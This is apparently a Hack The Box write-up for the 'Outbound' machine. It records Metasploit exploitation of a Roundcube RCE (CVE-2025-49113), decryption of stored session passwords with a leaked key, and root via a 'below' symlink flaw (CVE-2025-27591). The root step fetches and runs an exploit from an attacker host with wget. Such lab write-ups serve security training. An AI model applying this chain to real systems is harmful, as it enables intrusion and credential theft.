# Outbound: Easy

* we are given the following creds for this box: 'tyler:LhKL1o9Nm3X2'

```sh
sudo vim /etc/hosts
# add outbound.htb

nmap -T4 -p- -A -Pn -v outbound.htb
```

* open ports & services:

    * 22/tcp: ssh: OpenSSH 9.6p1 Ubuntu 3ubuntu13.12
    * 80/tcp: http: nginx 1.24.0

* the ```nmap``` scan mentions the subdomain 'mail.outbound.htb': update this in ```/etc/hosts```

* checking the webpage at 'http://mail.outbound.htb', we have a login page for Roundcube Webmail

* using the creds 'tyler:LhKL1o9Nm3X2', we are able to login, and we get access to the inbox page

* checking the mail and contacts does not give us anything

* checking the version info in the 'About' section, we have Roundcube Webmail 1.6.10: and there are some plugins installed:

    * archive: 3.5
    * filesystem_attachments: 1.0
    * jqueryui: 1.13.2
    * zipdownload: 3.4

* Googling for any exploits associated with Roundcube Webmail 1.6.10, we get [CVE-2025-49113: an authenticated RCE exploit](https://www.exploit-db.com/exploits/52324)

* the exploit is a Metasploit module: so we can try it out in ```msfconsole```:

    ```sh
    msfconsole -q

    search cve-2025-49113

    use 0

    options

    set PASSWORD LhKL1o9Nm3X2
    set USERNAME tyler
    set RHOSTS mail.outbound.htb
    set LHOST tun0

    run
    # this works
    # we have a meterpreter shell now

    shell
    # launch shell
    ```

* in the Meterpreter shell, we can check further with the system shell:

    ```sh
    id
    # www-data

    pwd
    # '/'

    hostname
    # 'mail.outbound.htb'

    hostname -I
    # gives IP '172.17.0.2'

    ip a s
    # confirms IP

    ls -la
    # '.dockerenv' found in root of filesystem

    ls -la /home
    # we have 3 users - 'jacob', 'mel', 'tyler'
    # no read access in home directories

    ls -la /opt

    ls -la /var/mail
    # we have some mail, but cannot read it

    ls -la /var/www/

    ls -la /var/www/html

    ls -la /var/www/html/roundcube

    ls -la /var/www/html/roundcube/config

    cat /var/www/html/roundcube/config/config.php
    # gives creds
    ```

* the instance seems to be a Docker container, so it is likely we may have to pivot to the actual host

* there are 3 users on this box, but we cannot read into any of their files

* also, checking the Roundcube config file gives us the MySQL DB creds 'roundcube:RCDBPass2025' and the cipher encryption key 'rcmail-!24ByteDESkey*Str'

* we can try checking for any secrets in the MySQL DB:

    ```sh
    mysql -u roundcube -pRCDBPass2025 -e "show databases"
    # this mentions the 'roundcube' DB

    mysql -u roundcube -pRCDBPass2025 -D roundcube -e "show tables"
    # check the 'users' table

    mysql -u roundcube -pRCDBPass2025 -D roundcube -e "select * from users"
    # this does not give any hashes
    
    # check other tables

    mysql -u roundcube -pRCDBPass2025 -D roundcube -e "select * from session"
    ```

* the 'users' table in the Roundcube DB mentions the 3 users, but does not contain any hashes for passwords

* the 'session' table contains some session data however: and it includes a 'vars' entry that includes a long, encoded blob of text

* Googling on this shows that the 'session' table is used to store active user session data, and the 'vars' field has serialised session data

* attempting to decode the encoded text from the 'var' field in CyberChef shows that it is Base64-encoded, and decoding it gives a lot of data related to ```imap```, where each key-value pair is separated by semicolons

* from the decoded data, we have a few findings:

    * username: 'jacob'
    * password: 'L7Rv00A8TuwJAr67kITxxcSgnIk25Am/'
    * auth_secret: 'DpYqv6maI9HxDL5GhcCd8JaQQW'
    * request_token: 'TIsOaABA1zHSXZOBpH6up5XFyayNRHaw'

* hash identifier tools are unable to detect this password hash/format, which means it is encrypted

* as the session data is identified and stored in encrypted format, to decode it, we can have a known set of values as well: so that we can confirm the decoding is done correctly

* for this case, we can login as 'tyler' in Roundcube, then fetch the encoded data and decode it from Base64: then we can apply the decryption steps (as the password is known for 'tyler', getting the same password on decryption confirms the steps)

* login as 'tyler', and use the same command: ```mysql -u roundcube -pRCDBPass2025 -D roundcube -e "select * from session"``` - to get the session data associated with 'tyler'

* on decoding the data, we have these values for 'tyler':

    * username: 'tyler'
    * password: 'k0xSWE15EGBpHbT6IFny0bNQZ8W2vuWs'
    * auth_secret: 'MNRc1MIcM6ZLrDtOP5wV7DzJCq'
    * request_token: 'A6HkCQRDEjGqtPNurIQu5NtWyssYP6W8'

* Googling for Roundcube password decryption leads to [this decrypt.sh script from Roundcube](https://github.com/roundcube/roundcubemail/blob/master/bin/decrypt.sh), as well as [this tool to decode Roundcube passwords](https://keydecryptor.com/decryption-tools/roundcube)

* we can try using the tool to check firstly:

    * the decryptor tool requires two inputs: 'input text' and 'key'

    * we can try using the encoded password 'k0xSWE15EGBpHbT6IFny0bNQZ8W2vuWs' for 'input text', and the cipher encryption key found earlier 'rcmail-!24ByteDESkey*Str' for 'key'

    * if we click on 'Decrypt', we get the cleartext 'LhKL1o9Nm3X2': which is the same as the password for 'tyler'

    * as the tool is confirmed to work, we can decode the creds for 'jacob' in the same manner

    * this works and we get the password '595mO8DmwGeD' for 'jacob'

* as we have valid creds 'jacob:595mO8DmwGeD', we can try logging into SSH: but this fails

* trying to use the same password for other users also fails

* we can try logging in with these creds in Roundcube though, and this works

* checking the Inbox, we have 2 unread emails: one of the emails gives the password 'gY4Wr3a1evp4', while the other email mentions the user has privileges to inspect the logs for ```below```, a resource monitoring tool

* we can SSH as 'jacob' now:

    ```sh
    ssh jacob@outbound.htb
    # this works

    ls -la

    cat user.txt
    # user flag

    sudo -l
    ```

* ```sudo -l``` shows that 'jacob' can run the following commands:

    ```sh
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
    ```

* as we can run ```below``` as sudo, but we cannot use any of the ```config``` or ```debug``` functionality, we can check for any privesc vectors associated with this binary:

    ```sh
    /usr/bin/below --version
    # version command not available
    # need to check 'help'

    /usr/bin/below --help
    ```

* ```below``` has the possible commands:

    * live: display live system data
    * record: record local system data
    * replay: replay historical data
    * debug: debugging facilities
    * dump: dump historical data
    * snapshot: create a historical snapshot file

* ```below``` also supports the options for ```config``` and ```debug```, but we cannot execute them as ```sudo``` as shown earlier

* Googling for privilege escalation exploits associated with ```below``` leads to [CVE-2025-27591: a privesc exploit due to a world-writable directory at '/var/log/below'](https://github.com/advisories/GHSA-9mc5-7qhg-fp3w)

* searching for exploits, we have [a POC for CVE-2025-27591](https://github.com/BridgerAlderson/CVE-2025-27591-PoC): we can try this:

    * we can first confirm if the directory ```/var/log/below``` is world-writable:

        ```sh
        ls -la /var/log/below
        # world-writable
        ```
    
    * then, we can download the exploit and run it to create the malicious symlink that updates ```/etc/passwd```:

        ```sh
        # fetch exploit from attacker

        wget http://10.10.14.95:8000/exploit.py

        python3 exploit.py
        # this works
        # we have root shell

        cat /root/root.txt
        # root flag
        ```
